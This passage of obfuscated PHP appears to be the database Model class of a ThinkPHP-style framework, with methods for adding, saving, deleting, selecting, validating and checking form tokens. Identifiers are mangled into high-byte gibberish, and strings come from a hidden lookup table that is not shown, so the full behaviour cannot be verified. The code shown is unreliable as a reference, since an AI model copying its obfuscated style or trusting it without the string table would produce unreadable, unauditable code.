think_var_cache($Õ‘œ²ó[247] . strtolower(get_path_this($ŸËÙ×ğ‹) . $Õ‘œ²ó[10] . $this->name)); if ($ÃÇ¨…Ú´) { $ª¡ÊĞä = think_config($Õ‘œ²ó[248]); if (empty($ª¡ÊĞä) || $ÃÇ¨…Ú´[$Õ‘œ²ó[249]] == $ª¡ÊĞä) { $this->fields = $ÃÇ¨…Ú´; return; } } } $this->flush(); } } public function flush() { $Óû›²å =& $_SERVER[³·—™¤¢]; $this->db->setModel($this->name); $êÄ€÷Ú‘ = $this->db->getFields($this->getTableName()); if (!$êÄ€÷Ú‘) { return !1; } $this->fields = array_keys($êÄ€÷Ú‘); $this->fields[$Óû›²å[250]] = !1; foreach ($êÄ€÷Ú‘ as $ûìäµĞ‹ => $ğóûûÓï) { $é½Åë‹¤[$ûìäµĞ‹] = $ğóûûÓï[$Óû›²å[33]]; if ($ğóûûÓï[$Óû›²å[39]]) { $this->fields[$Óû›²å[251]] = $ûìäµĞ‹; if ($ğóûûÓï[$Óû›²å[42]]) { $this->fields[$Óû›²å[250]] = !0; } } } $this->fields[$Óû›²å[252]] = $é½Åë‹¤; if (think_config($Óû›²å[248])) { $this->fields[$Óû›²å[249]] = think_config($Óû›²å[248]); } if (think_config($Óû›²å[245])) { $áúĞñô£ = $this->dbName ? $this->dbName : think_config($Óû›²å[246]); think_var_cache($Óû›²å[247] . strtolower(get_path_this($áúĞñô£) . $Óû›²å[10] . $this->name), $this->fields); } } public function switchModel($×¸´¼êŒ, $ÒÓ¯÷íÕ = array()) { $ùéÍúÊ =& $_SERVER[³·—™¤¢]; $éà©Îíá = ucwords(strtolower($×¸´¼êŒ)) . $ùéÍúÊ[253]; if (!class_exists($éà©Îíá)) { think_exception($éà©Îíá . think_lang($ùéÍúÊ[254])); } $this->_extModel = new $éà©Îíá($this->name); if (!empty($ÒÓ¯÷íÕ)) { foreach ($ÒÓ¯÷íÕ as $©¶–øÙ­) { $this->_extModel->setProperty($©¶–øÙ­, $this->{$©¶–øÙ­}); } } return $this->_extModel; } public function __set($àœ“ìÙ, $ù†ºÉ˜) { $this->data[$àœ“ìÙ] = $ù†ºÉ˜; } public function __get($åì¢ŒÆÊ) { return isset($this->data[$åì¢ŒÆÊ]) ? $this->data[$åì¢ŒÆÊ] : null; } public function __isset($®¹“ªÌÓ) { return isset($this->data[$®¹“ªÌÓ]); } public function __unset($´ã³µ£) { unset($this->data[$´ã³µ£]); } public function __call($Ğø±¢©á, $ƒéò™®ú) { $ã¡¶ù×ô =& $_SERVER[³·—™¤¢]; if (in_array(strtolower($Ğø±¢©á), $this->methods, !0)) { $this->options[strtolower($Ğø±¢©á)] = $ƒéò™®ú[0]; return $this; } elseif (in_array(strtolower($Ğø±¢©á), array($ã¡¶ù×ô[255], $ã¡¶ù×ô[256], $ã¡¶ù×ô[257], $ã¡¶ù×ô[258], $ã¡¶ù×ô[259]), !0)) { $ÕäÖò×¤ = isset($ƒéò™®ú[0]) ? $ƒéò™®ú[0] : $ã¡¶ù×ô[188]; $ÕäÖò×¤ = $this->db->parseKey($ÕäÖò×¤); return $this->getField(strtoupper($Ğø±¢©á) . $ã¡¶ù×ô[260] . $ÕäÖò×¤ . $ã¡¶ù×ô[261] . $Ğø±¢©á, $ã¡¶ù×ô[255]); } elseif (strtolower(substr($Ğø±¢©á, 0, 5)) == $ã¡¶ù×ô[262]) { $ÕäÖò×¤ = think_parse_name(substr($Ğø±¢©á, 5)); $¬úôıœ–[$ÕäÖò×¤] = $ƒéò™®ú[0]; return $this->where($¬úôıœ–)->find(); } elseif (strtolower(substr($Ğø±¢©á, 0, 10)) == $ã¡¶ù×ô[263]) { $êÈ…Àçé = think_parse_name(substr($Ğø±¢©á, 10)); $¬úôıœ–[$êÈ…Àçé] = $ƒéò™®ú[0]; return $this->where($¬úôıœ–)->getField($ƒéò™®ú[1]); } elseif (isset($this->_scope[$Ğø±¢©á])) { return $this->scope($Ğø±¢©á, $ƒéò™®ú[0]); } elseif (method_exists($this, $Ğø±¢©á)) { array_unshift($ƒéò™®ú, $Ğø±¢©á); return call_user_func_array(array($this, $ã¡¶ù×ô[264]), $ƒéò™®ú); } else { return call_user_func_array(array(parent, $Ğø±¢©á), $ƒéò™®ú); } } protected function call() { $Îù¤‹¶’ =& $_SERVER[³·—™¤¢]; $­Œ±¬¦ = func_get_args(); $á‹Óµ„é = array_shift($­Œ±¬¦); $Øî³çó = $á‹Óµ„é; if (is_array($á‹Óµ„é)) { $Øî³çó = $á‹Óµ„é[1]; $á‹Óµ„é = $á‹Óµ„é[0]; } $îığÖ­ê = count($­Œ±¬¦) - 1; if (isset($­Œ±¬¦[$îığÖ­ê]) && $­Œ±¬¦[$îığÖ­ê] === $á‹Óµ„é) { think_exception(__CLASS__ . $Îù¤‹¶’[4] . $á‹Óµ„é . think_lang($Îù¤‹¶’[265])); return; } $­Œ±¬¦[] = $á‹Óµ„é; if (method_exists($this, $Îù¤‹¶’[266])) { $ã«©¸…â = call_user_func_array(array($this, $Îù¤‹¶’[267]), array($Øî³çó, $­Œ±¬¦)); if (!is_null($ã«©¸…â) && $ã«©¸…â !== !1) { return $ã«©¸…â; } } $ÅÏÛÕ = call_user_func_array(array($this, $á‹Óµ„é), $­Œ±¬¦); if (method_exists($this, $Îù¤‹¶’[268])) { $ã«©¸…â = call_user_func_array(array($this, $Îù¤‹¶’[269]), array($Øî³çó, $­Œ±¬¦, $ÅÏÛÕ)); if ($ã«©¸…â) { return $ã«©¸…â; } } return $ÅÏÛÕ; } protected function _initialize() { } protected function _facade($ó‘—«Æ¸) { $¸²†¨ =& $_SERVER[³·—™¤¢]; if (!empty($this->fields)) { foreach ($ó‘—«Æ¸ as $Ñ´„Şù¦ => $ğ˜ãñ¤µ) { if (is_array($this->fields) && !in_array($Ñ´„Şù¦, $this->fields, !0)) { unset($ó‘—«Æ¸[$Ñ´„Şù¦]); } elseif (is_scalar($ğ˜ãñ¤µ)) { $this->_parseType($ó‘—«Æ¸, $Ñ´„Şù¦); } } } if (!empty($this->options[$¸²†¨[270]])) { $ó‘—«Æ¸ = array_map($this->options[$¸²†¨[270]], $ó‘—«Æ¸); unset($this->options[$¸²†¨[270]]); } $this->_beforeWrite($ó‘—«Æ¸); return $ó‘—«Æ¸; } protected function _beforeWrite(&$¤…ÕÇÛ†) { } public function add($¾°©œÖÉ = '', $õÅÂ²ü = array(), $œ¨°ò¼Ç = false) { if (empty($¾°©œÖÉ)) { if (!empty($this->data)) { $¾°©œÖÉ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[³·—™¤¢][271]); return !1; } } $õÅÂ²ü = $this->_parseOptions($õÅÂ²ü); $¾°©œÖÉ = $this->_facade($¾°©œÖÉ); if (!1 === $this->_beforeInsert($¾°©œÖÉ, $õÅÂ²ü)) { return !1; } $ÍÎ¡ùÃ¸ = $this->db->insert($¾°©œÖÉ, $õÅÂ²ü, $œ¨°ò¼Ç); if (!1 !== $ÍÎ¡ùÃ¸) { $ºïÛ•ú¦ = $this->getLastInsID(); if ($ºïÛ•ú¦) { $¾°©œÖÉ[$this->getPk()] = $ºïÛ•ú¦; $this->_after_insert($¾°©œÖÉ, $õÅÂ²ü); return $ºïÛ•ú¦; } $this->_after_insert($¾°©œÖÉ, $õÅÂ²ü); } return $ÍÎ¡ùÃ¸; } protected function _beforeInsert(&$¦õñ¢Ã¯, $ĞŞ´ï‡ú) { } protected function _after_insert($Ôßü’, $ôÒ¹†Ñ) { } public function addAll($ìª¹ãÙ©, $¸œÕ³Õ = array(), $Ôà·ÏĞ = false) { $ô¥œì‹ =& $_SERVER[³·—™¤¢]; if (empty($ìª¹ãÙ©)) { $this->error = think_lang($ô¥œì‹[271]); return !1; } $¸œÕ³Õ = $this->_parseOptions($¸œÕ³Õ); foreach ($ìª¹ãÙ© as $İ•´§µû => $Ú´Üê›É) { $ìª¹ãÙ©[$İ•´§µû] = $this->_facade($Ú´Üê›É); } if (method_exists($this->db, $ô¥œì‹[272])) { $íòˆÄÅÌ = $this->db->insertAll($ìª¹ãÙ©, $¸œÕ³Õ, $Ôà·ÏĞ); } else { $this->startTrans(); foreach ($ìª¹ãÙ© as $İ•´§µû => $Ú´Üê›É) { $íòˆÄÅÌ = $this->db->insert($Ú´Üê›É, $¸œÕ³Õ, $Ôà·ÏĞ); } $this->commit(); } if (!1 !== $íòˆÄÅÌ) { $ê®¡ÍÏì = $this->getLastInsID(); if ($ê®¡ÍÏì) { return $ê®¡ÍÏì; } } return $íòˆÄÅÌ; } public function selectAdd($Œ÷°ö‚ = '', $ª²é¹Êş = '', $òœ°…¡ = array()) { $ô‚ÑÍÚ =& $_SERVER[³·—™¤¢]; $òœ°…¡ = $this->_parseOptions($òœ°…¡); if (!1 === ($ÄÕÏ‡ = $this->db->selectInsert($Œ÷°ö‚ ? $Œ÷°ö‚ : $òœ°…¡[$ô‚ÑÍÚ[273]], $ª²é¹Êş ? $ª²é¹Êş : $this->getTableName(), $òœ°…¡))) { $this->error = think_lang($ô‚ÑÍÚ[274]); return !1; } else { return $ÄÕÏ‡; } } public function save($Õ² ´—¢ = '', $¬À«Œ®× = array()) { $ÑâÚ‡²¯ =& $_SERVER[³·—™¤¢]; if (empty($Õ² ´—¢)) { if (!empty($this->data)) { $Õ² ´—¢ = $this->data; $this->data = array(); } else { $this->error = think_lang($ÑâÚ‡²¯[271]); return !1; } } $Õ² ´—¢ = $this->_facade($Õ² ´—¢); $¬À«Œ®× = $this->_parseOptions($¬À«Œ®×); $²ƒèå¤ß = $this->getPk(); if (!isset($¬À«Œ®×[$ÑâÚ‡²¯[275]])) { if (isset($Õ² ´—¢[$²ƒèå¤ß])) { $íˆš™éá[$²ƒèå¤ß] = $Õ² ´—¢[$²ƒèå¤ß]; $¬À«Œ®×[$ÑâÚ‡²¯[275]] = $íˆš™éá; unset($Õ² ´—¢[$²ƒèå¤ß]); } else { $this->error = think_lang($ÑâÚ‡²¯[274]); return !1; } } if (is_array($¬À«Œ®×[$ÑâÚ‡²¯[275]]) && isset($¬À«Œ®×[$ÑâÚ‡²¯[275]][$²ƒèå¤ß])) { $½íıùú = $¬À«Œ®×[$ÑâÚ‡²¯[275]][$²ƒèå¤ß]; } if (!1 === $this->_beforeUpdate($Õ² ´—¢, $¬À«Œ®×)) { return !1; } $‰öÛŞºï = $this->db->update($Õ² ´—¢, $¬À«Œ®×); if (!1 !== $‰öÛŞºï) { if (isset($½íıùú)) { $Õ² ´—¢[$²ƒèå¤ß] = $½íıùú; } $this->_afterUpdate($Õ² ´—¢, $¬À«Œ®×); } return $‰öÛŞºï; } protected function _beforeUpdate(&$Ü¤Ş©ª, $Ï‰ü°û½) { } protected function _afterUpdate($£Õ ¯â™, $ÛÆ¼£çÕ) { } public function delete($„äñÔÙ« = array()) { $¼ÕŸõ =& $_SERVER[³·—™¤¢]; if (empty($„äñÔÙ«) && empty($this->options[$¼ÕŸõ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ëáğãúş = $this->getPk(); if (is_numeric($„äñÔÙ«) || is_string($„äñÔÙ«)) { if (strpos($„äñÔÙ«, $¼ÕŸõ[50])) { $Âäà¥”Ğ[$ëáğãúş] = array($¼ÕŸõ[276], $„äñÔÙ«); } else { $Âäà¥”Ğ[$ëáğãúş] = $„äñÔÙ«; } $this->options[$¼ÕŸõ[275]] = $Âäà¥”Ğ; } $„äñÔÙ« = $this->_parseOptions(); if (is_array($„äñÔÙ«[$¼ÕŸõ[275]]) && isset($„äñÔÙ«[$¼ÕŸõ[275]][$ëáğãúş])) { $ášÆ—© = $„äñÔÙ«[$¼ÕŸõ[275]][$ëáğãúş]; } $Ø¨õšùß = $this->db->delete($„äñÔÙ«); if (!1 !== $Ø¨õšùß) { $Øî†òğ© = array(); if (isset($ášÆ—©)) { $Øî†òğ©[$ëáğãúş] = $ášÆ—©; } $this->_after_delete($Øî†òğ©, $„äñÔÙ«); } return $Ø¨õšùß; } protected function _after_delete($Î°¹÷ä, $ƒÕÅÏ°ª) { } public function select($§¨‰™Õİ = array()) { $¯Œ­¤ª² =& $_SERVER[³·—™¤¢]; if (is_string($§¨‰™Õİ) || is_numeric($§¨‰™Õİ)) { $ø²ˆ—ü± = $this->getPk(); if (strpos($§¨‰™Õİ, $¯Œ­¤ª²[50])) { $Ü‚´ŠÃÅ[$ø²ˆ—ü±] = array($¯Œ­¤ª²[276], $§¨‰™Õİ); } else { $Ü‚´ŠÃÅ[$ø²ˆ—ü±] = $§¨‰™Õİ; } $this->options[$¯Œ­¤ª²[275]] = $Ü‚´ŠÃÅ; } elseif (!1 === $§¨‰™Õİ) { $§¨‰™Õİ = $this->_parseOptions(); return $¯Œ­¤ª²[277] . $this->db->buildSelectSql($§¨‰™Õİ) . $¯Œ­¤ª²[278]; } $§¨‰™Õİ = $this->_parseOptions(); $°ªóŠúÊ = $this->db->select($§¨‰™Õİ); if (!1 === $°ªóŠúÊ) { return !1; } if (empty($°ªóŠúÊ)) { return null; } $this->_afterSelect($°ªóŠúÊ, $§¨‰™Õİ); return $°ªóŠúÊ; } protected function _afterSelect(&$¸€Ê¯ğÚ, $ß©êí) { } public function buildSql($ïÁ®şÆ‘ = array()) { $”ÊÉøÍ =& $_SERVER[³·—™¤¢]; $ïÁ®şÆ‘ = $this->_parseOptions($ïÁ®şÆ‘); return $”ÊÉøÍ[277] . $this->db->buildSelectSql($ïÁ®şÆ‘) . $”ÊÉøÍ[278]; } public function optionsValue($‘ÀÈç¡› = null) { if (is_null($‘ÀÈç¡›)) { return $this->options; } elseif (is_array($‘ÀÈç¡›)) { $this->options = array_merge($this->options, $‘ÀÈç¡›); } } protected function _parseOptions($˜Å©¬ï„ = array()) { $êßè›ˆò =& $_SERVER[³·—™¤¢]; if (is_array($˜Å©¬ï„)) { $˜Å©¬ï„ = array_merge($this->options, $˜Å©¬ï„); } $this->options = array(); if (!isset($˜Å©¬ï„[$êßè›ˆò[279]])) { $˜Å©¬ï„[$êßè›ˆò[279]] = $this->getTableName(); $Î—±Îöñ = $this->fields; } else { $Î—±Îöñ = $this->getDbFields(); } if (!empty($˜Å©¬ï„[$êßè›ˆò[280]])) { $˜Å©¬ï„[$êßè›ˆò[279]] .= $êßè›ˆò[53] . $˜Å©¬ï„[$êßè›ˆò[280]]; } $˜Å©¬ï„[$êßè›ˆò[281]] = $this->name; if (isset($˜Å©¬ï„[$êßè›ˆò[275]]) && is_array($˜Å©¬ï„[$êßè›ˆò[275]]) && !empty($Î—±Îöñ) && !isset($˜Å©¬ï„[$êßè›ˆò[282]]) && !isset($˜Å©¬ï„[$êßè›ˆò[279]])) { foreach ($˜Å©¬ï„[$êßè›ˆò[275]] as $‹±ùè¶® => $Àøª˜î†) { $‹±ùè¶® = trim($‹±ùè¶®); if (in_array($‹±ùè¶®, $Î—±Îöñ, !0)) { if (is_scalar($Àøª˜î†)) { $this->_parseType($˜Å©¬ï„[$êßè›ˆò[275]], $‹±ùè¶®); } } elseif (!is_numeric($‹±ùè¶®) && $êßè›ˆò[11] != substr($‹±ùè¶®, 0, 1) && !1 === strpos($‹±ùè¶®, $êßè›ˆò[10]) && !1 === strpos($‹±ùè¶®, $êßè›ˆò[260]) && !1 === strpos($‹±ùè¶®, $êßè›ˆò[283]) && !1 === strpos($‹±ùè¶®, $êßè›ˆò[284])) { unset($˜Å©¬ï„[$êßè›ˆò[275]][$‹±ùè¶®]); } } } $this->_options_filter($˜Å©¬ï„); return $˜Å©¬ï„; } protected function _options_filter(&$œ€ÇïˆÏ) { } protected function _parseType(&$“¥†Úæ, $Æé—âé) { $»ïä‘ú¯ =& $_SERVER[³·—™¤¢]; if (empty($this->options[$»ïä‘ú¯[285]][$»ïä‘ú¯[4] . $Æé—âé])) { $ıóã› î = strtolower($this->fields[$»ïä‘ú¯[252]][$Æé—âé]); if (!1 !== strpos($ıóã› î, $»ïä‘ú¯[286])) { } elseif (!1 === strpos($ıóã› î, $»ïä‘ú¯[287]) && !1 !== strpos($ıóã› î, $»ïä‘ú¯[288])) { $“¥†Úæ[$Æé—âé] = intval($“¥†Úæ[$Æé—âé]); } elseif (!1 !== strpos($ıóã› î, $»ïä‘ú¯[289]) || !1 !== strpos($ıóã› î, $»ïä‘ú¯[290])) { $“¥†Úæ[$Æé—âé] = floatval($“¥†Úæ[$Æé—âé]); } elseif (!1 !== strpos($ıóã› î, $»ïä‘ú¯[291])) { $“¥†Úæ[$Æé—âé] = (bool) $“¥†Úæ[$Æé—âé]; } } } public function find($ˆÛåÂš = array()) { $–…½ÈÚï =& $_SERVER[³·—™¤¢]; if (is_numeric($ˆÛåÂš) || is_string($ˆÛåÂš)) { $ˆ±ÂÆä‡[$this->getPk()] = intval($ˆÛåÂš); $this->options[$–…½ÈÚï[275]] = $ˆ±ÂÆä‡; } $this->options[$–…½ÈÚï[292]] = 1; $ˆÛåÂš = $this->_parseOptions(); $”‹Š¥ë÷ = $this->db->select($ˆÛåÂš); if (!1 === $”‹Š¥ë÷) { return !1; } if (empty($”‹Š¥ë÷)) { return null; } $this->data = $”‹Š¥ë÷[0]; $this->_afterFind($this->data, $ˆÛåÂš); if (!empty($this->options[$–…½ÈÚï[293]])) { return $this->returnResult($this->data, $this->options[$–…½ÈÚï[293]]); } return $this->data; } protected function _afterFind(&$¨é‚¤¼£, $ƒÙÌˆàı) { } protected function returnResult($õ¬½”åˆ, $Ş¶×¿Ñ˜ = '') { $åóĞ¡Ç¡ =& $_SERVER[³·—™¤¢]; if ($Ş¶×¿Ñ˜) { if (is_callable($Ş¶×¿Ñ˜)) { return call_user_func($Ş¶×¿Ñ˜, $õ¬½”åˆ); } switch (strtolower($Ş¶×¿Ñ˜)) { case $åóĞ¡Ç¡[294]: return json_encode($õ¬½”åˆ); case $åóĞ¡Ç¡[295]: return xml_encode($õ¬½”åˆ); } } return $õ¬½”åˆ; } public function parseFieldsMap($İ§Óï©é, $ÉïÍŠš£ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $—Ñ™‹ïœ => $ıÆÀóæ¶) { if ($ÉïÍŠš£ == 1) { if (isset($İ§Óï©é[$ıÆÀóæ¶])) { $İ§Óï©é[$—Ñ™‹ïœ] = $İ§Óï©é[$ıÆÀóæ¶]; unset($İ§Óï©é[$ıÆÀóæ¶]); } } else { if (isset($İ§Óï©é[$—Ñ™‹ïœ])) { $İ§Óï©é[$ıÆÀóæ¶] = $İ§Óï©é[$—Ñ™‹ïœ]; unset($İ§Óï©é[$—Ñ™‹ïœ]); } } } } return $İ§Óï©é; } public function setField($¬€©ó¿, $ğÂ¸ÊÕ¤ = '') { if (is_array($¬€©ó¿)) { $…î¯ÄØÉ = $¬€©ó¿; } else { $…î¯ÄØÉ[$¬€©ó¿] = $ğÂ¸ÊÕ¤; } return $this->save($…î¯ÄØÉ); } public function setAdd($ş¯ôŸÚ”, $åŸ·çÎ± = 1) { $Ì³ê•šÛ =& $_SERVER[³·—™¤¢]; $‚ä÷ƒ¼Ø = $ş¯ôŸÚ” . $Ì³ê•šÛ[296] . $åŸ·çÎ±; if ($åŸ·çÎ± < 0) { $‚ä÷ƒ¼Ø = $ş¯ôŸÚ” . $åŸ·çÎ±; } return $this->setField($ş¯ôŸÚ”, array($Ì³ê•šÛ[297], $‚ä÷ƒ¼Ø)); } public function getField($±¥œé¯¬, $ÎŞãõéÃ = null) { $½™úğ‹… =& $_SERVER[³·—™¤¢]; $‰’ë»œâ[$½™úğ‹…[273]] = $±¥œé¯¬; $‰’ë»œâ = $this->_parseOptions($‰’ë»œâ); $±¥œé¯¬ = trim($±¥œé¯¬); if (strpos($±¥œé¯¬, $½™úğ‹…[50])) { if (!isset($‰’ë»œâ[$½™úğ‹…[292]])) { $‰’ë»œâ[$½™úğ‹…[292]] = is_numeric($ÎŞãõéÃ) ? $ÎŞãõéÃ : $½™úğ‹…[12]; } $•å—´À = $this->db->select($‰’ë»œâ); if (!empty($•å—´À)) { $‡¦ˆ¦› = explode($½™úğ‹…[50], $±¥œé¯¬); $±¥œé¯¬ = array_keys($•å—´À[0]); $ÆûâŞˆ = array_shift($±¥œé¯¬); $¿ï¦ƒÓ = array_shift($±¥œé¯¬); $˜ìóõä‘ = array(); $²ğ¼Ò† = count($‡¦ˆ¦›); foreach ($•å—´À as $¥î£âÙÑ) { $şŞ‰°° = $¥î£âÙÑ[$ÆûâŞˆ]; if (2 == $²ğ¼Ò†) { $˜ìóõä‘[$şŞ‰°°] = $¥î£âÙÑ[$¿ï¦ƒÓ]; } else { $˜ìóõä‘[$şŞ‰°°] = is_string($ÎŞãõéÃ) ? implode($ÎŞãõéÃ, $¥î£âÙÑ) : $¥î£âÙÑ; } } return $˜ìóõä‘; } } else { if (!0 !== $ÎŞãõéÃ) { $‰’ë»œâ[$½™úğ‹…[292]] = is_numeric($ÎŞãõéÃ) ? $ÎŞãõéÃ : 1; } if ($ÎŞãõéÃ === $½™úğ‹…[255]) { unset($‰’ë»œâ[$½™úğ‹…[292]]); } $¥î£âÙÑ = $this->db->select($‰’ë»œâ); if (!empty($¥î£âÙÑ)) { if ($ÎŞãõéÃ === $½™úğ‹…[255]) { return reset($¥î£âÙÑ[0]); } if (!0 !== $ÎŞãõéÃ && 1 == $‰’ë»œâ[$½™úğ‹…[292]]) { return reset($¥î£âÙÑ[0]); } foreach ($¥î£âÙÑ as $‚ô¦¬Ç) { $Ó‘Ö±[] = $‚ô¦¬Ç[$±¥œé¯¬]; } return $Ó‘Ö±; } } return null; } public function create($ï§ïû¤™ = '', $ĞìÓó­¯ = '') { $Æå½ïõ‡ =& $_SERVER[³·—™¤¢]; if (empty($ï§ïû¤™)) { $ï§ïû¤™ = $_POST; } elseif (is_object($ï§ïû¤™)) { $ï§ïû¤™ = get_object_vars($ï§ïû¤™); } if (empty($ï§ïû¤™) || !is_array($ï§ïû¤™)) { $this->error = think_lang($Æå½ïõ‡[271]); return !1; } $ï§ïû¤™ = $this->parseFieldsMap($ï§ïû¤™, 0); $ĞìÓó­¯ = $ĞìÓó­¯ ? $ĞìÓó­¯ : (!empty($ï§ïû¤™[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Æå½ïõ‡[273]])) { $ Õ…©Ï” = $this->options[$Æå½ïõ‡[273]]; unset($this->options[$Æå½ïõ‡[273]]); } elseif ($ĞìÓó­¯ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ Õ…©Ï” = $this->insertFields; } elseif ($ĞìÓó­¯ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ Õ…©Ï” = $this->updateFields; } if (isset($ Õ…©Ï”)) { if (is_string($ Õ…©Ï”)) { $ Õ…©Ï” = explode($Æå½ïõ‡[50], $ Õ…©Ï”); } if (think_config($Æå½ïõ‡[298])) { $ Õ…©Ï”[] = think_config($Æå½ïõ‡[299]); } foreach ($ï§ïû¤™ as $·úĞ²¿ => $ïôŸ‚è) { if (!in_array($·úĞ²¿, $ Õ…©Ï”)) { unset($ï§ïû¤™[$·úĞ²¿]); } } } if (!$this->autoValidation($ï§ïû¤™, $ĞìÓó­¯)) { return !1; } if (!$this->autoCheckToken($ï§ïû¤™)) { $this->error = think_lang($Æå½ïõ‡[300]); return !1; } if ($this->autoCheckFields) { $ Õ…©Ï” = $this->getDbFields(); foreach ($ï§ïû¤™ as $·úĞ²¿ => $ïôŸ‚è) { if (!in_array($·úĞ²¿, $ Õ…©Ï”)) { unset($ï§ïû¤™[$·úĞ²¿]); } elseif (MAGIC_QUOTES_GPC && is_string($ïôŸ‚è)) { $ï§ïû¤™[$·úĞ²¿] = stripslashes($ïôŸ‚è); } } } $this->autoOperation($ï§ïû¤™, $ĞìÓó­¯); $this->data = $ï§ïû¤™; return $ï§ïû¤™; } public function autoCheckToken($˜°«äİâ) { $ğ¯à®Êİ =& $_SERVER[³·—™¤¢]; if (isset($this->options[$ğ¯à®Êİ[301]]) && !$this->options[$ğ¯à®Êİ[301]]) { return !0; } if (think_config($ğ¯à®Êİ[298])) { $±óğ»» = think_config($ğ¯à®Êİ[299]); if (!isset($˜°«äİâ[$±óğ»»]) || Session::get($±óğ»»)) { return !1; } list($ñçÕßÉÍ, $”‹Ì°ò») = explode($ğ¯à®Êİ[11], $˜°«äİâ[$±óğ»»]); if ($”‹Ì°ò» && Session::get($±óğ»» . $ğ¯à®Êİ[10] . $ñçÕßÉÍ) === $”‹Ì°ò») { Session::remove($±óğ»» . $ğ¯à®Êİ[10] . $ñçÕßÉÍ); return !0; } if (think_config($ğ¯à®Êİ[302])) { Session::remove($±óğ»» . $ğ¯à®Êİ[10] . $ñçÕßÉÍ); } return !1; } return !0; } public function regex($ƒ¿šêå¦, $¾¨ ´ß­) { $´–›¢™ =& $_SERVER[³·—™¤¢]; $àÅ³Øøƒ = array($´–›¢™[303] => $´–›¢™[304], $´–›¢™[305] => $´–›¢™[306], $´–›¢™[307] => $´–›¢™[308], $´–›¢™[309] => $´–›¢™[310], $´–›¢™[311] => $´–›¢™[312], $´–›¢™[313] => $´–›¢™[314], $´–›¢™[315] => $´–›¢™[316], $´–›¢™[290] => $´–›¢™[317], $´–›¢™[318] => $´–›¢™[319]); if (isset($àÅ³Øøƒ[strtolower($¾¨ ´ß­)])) { $¾¨ ´ß­ = $àÅ³Øøƒ[strtolower($¾¨ ´ß­)]; } return preg_match($¾¨ ´ß­, $ƒ¿šêå¦) === 1; } private function autoOperation(&$êó¸†¦à, $×ÛÇªßË) { $‡¹àÄÆ¾ =& $_SERVER[³·—™¤¢]; if (!empty($this->options[$‡¹àÄÆ¾[320]])) { $‰€«¯ı = $this->options[$‡¹àÄÆ¾[320]]; unset($this->options[$‡¹àÄÆ¾[320]]); } elseif (!empty($this->_auto)) { $‰€«¯ı = $this->_auto; } if (isset($‰€«¯ı)) { foreach ($‰€«¯ı as $àÜåİöØ) { if (empty($àÜåİöØ[2])) { $àÜåİöØ[2] = THINK_MODEL_INSERT; } if ($×ÛÇªßË == $àÜåİöØ[2] || $àÜåİöØ[2] == THINK_MODEL_BOTH) { switch (trim($àÜåİöØ[3])) { case $‡¹àÄÆ¾[321]: case $‡¹àÄÆ¾[322]: $ÇÛŒ¶“ë = isset($àÜåİöØ[4]) ? (array) $àÜåİöØ[4] : array(); if (isset($êó¸†¦à[$àÜåİöØ[0]])) { array_unshift($ÇÛŒ¶“ë, $êó¸†¦à[$àÜåİöØ[0]]); } if ($‡¹àÄÆ¾[321] == $àÜåİöØ[3]) { $êó¸†¦à[$àÜåİöØ[0]] = call_user_func_array($àÜåİöØ[1], $ÇÛŒ¶“ë); } else { $êó¸†¦à[$àÜåİöØ[0]] = call_user_func_array(array(&$this, $àÜåİöØ[1]), $ÇÛŒ¶“ë); } break; case $‡¹àÄÆ¾[273]: $êó¸†¦à[$àÜåİöØ[0]] = $êó¸†¦à[$àÜåİöØ[1]]; break; case $‡¹àÄÆ¾[323]: if ($‡¹àÄÆ¾[12] === $êó¸†¦à[$àÜåİöØ[0]]) { unset($êó¸†¦à[$àÜåİöØ[0]]); } break; case $‡¹àÄÆ¾[324]: default: $êó¸†¦à[$àÜåİöØ[0]] = $àÜåİöØ[1]; } if (!1 === $êó¸†¦à[$àÜåİöØ[0]]) { unset($êó¸†¦à[$àÜåİöØ[0]]); } } } } return $êó¸†¦à; } protected function autoValidation($¬¹½‘‰Í, $Îğ³ˆ«š) { $èáŸô =& $_SERVER[³·—™¤¢]; if (!empty($this->options[$èáŸô[325]])) { $İ³ßõàõ = $this->options[$èáŸô[325]]; unset($this->options[$èáŸô[325]]); } elseif (!empty($this->_validate)) { $İ³ßõàõ = $this->_validate; } if (isset($İ³ßõàõ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($İ³ßõàõ as $°êÃÄÓó => $Ì”†’©) { if (empty($Ì”†’©[5]) || $Ì”†’©[5] == THINK_MODEL_BOTH || $Ì”†’©[5] == $Îğ³ˆ«š) { if (0 == strpos($Ì”†’©[2], $èáŸô[326]) && strpos($Ì”†’©[2], $èáŸô[327])) { $Ì”†’©[2] = think_lang(substr($Ì”†’©[2], 2, -1)); } $Ì”†’©[3] = isset($Ì”†’©[3]) ? $Ì”†’©[3] : THINK_EXISTS_VALIDATE; $Ì”†’©[4] = isset($Ì”†’©[4]) ? $Ì”†’©[4] : $èáŸô[328]; switch ($Ì”†’©[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¬¹½‘‰Í, $Ì”†’©)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($èáŸô[12] != trim($¬¹½‘‰Í[$Ì”†’©[0]])) { if (!1 === $this->_validationField($¬¹½‘‰Í, $Ì”†’©)) { return !1; } } break; default: if (isset($¬¹½‘‰Í[$Ì”†’©[0]])) { if (!1 === $this->_validationField($¬¹½‘‰Í, $Ì”†’©)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($òŞÅ¾•’, $¯§Éİü) { if (!1 === $this->_validationFieldItem($òŞÅ¾•’, $¯§Éİü)) { if ($this->patchValidate) { $this->error[$¯§Éİü[0]] = $¯§Éİü[2]; } else { $this->error = $¯§Éİü[2]; return !1; } } return; } protected function _validationFieldItem($½¾Õ‡İ, $È§‘ó…) { $õğàİŸï =& $_SERVER[³·—™¤¢]; switch (strtolower(trim($È§‘ó…[4]))) { case $õğàİŸï[321]: case $õğàİŸï[322]: $èÕ€Š×– = isset($È§‘ó…[6]) ? (array) $È§‘ó…[6] : array(); if (is_string($È§‘ó…[0]) && strpos($È§‘ó…[0], $õğàİŸï[50])) { $È§‘ó…[0] = explode($õğàİŸï[50], $È§‘ó…[0]); } if (is_array($È§‘ó…[0])) { foreach 